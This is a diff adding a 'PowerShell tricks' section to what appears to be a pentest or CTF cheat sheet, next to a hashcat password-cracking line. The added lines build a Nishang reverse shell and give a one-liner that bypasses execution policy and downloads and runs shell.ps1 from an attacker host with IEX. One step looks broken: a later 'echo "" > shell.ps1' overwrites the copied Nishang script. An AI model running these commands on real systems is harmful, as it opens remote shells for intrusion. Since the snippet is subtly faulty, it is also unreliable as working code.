@@ -37,6 +37,16 @@ ___
 - Password cracking: `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
 	+ `-r /usr/share/hashcat/rules/best64.rule` (Rule-based Attack)
 
+- PowerShell tricks:
+  + Turn RCE to complete shell using [Nishang](https://github.com/samratashok/nishang#nishang) ⬇️ 	
+	```bash
+	cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+	echo "" > shell.ps1
+	echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 443" >> shell.ps1
+	# run HTTP server
+	```
+	* PowerShell command: `powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1');"`
+
 ___
 
 ## Common services/ports
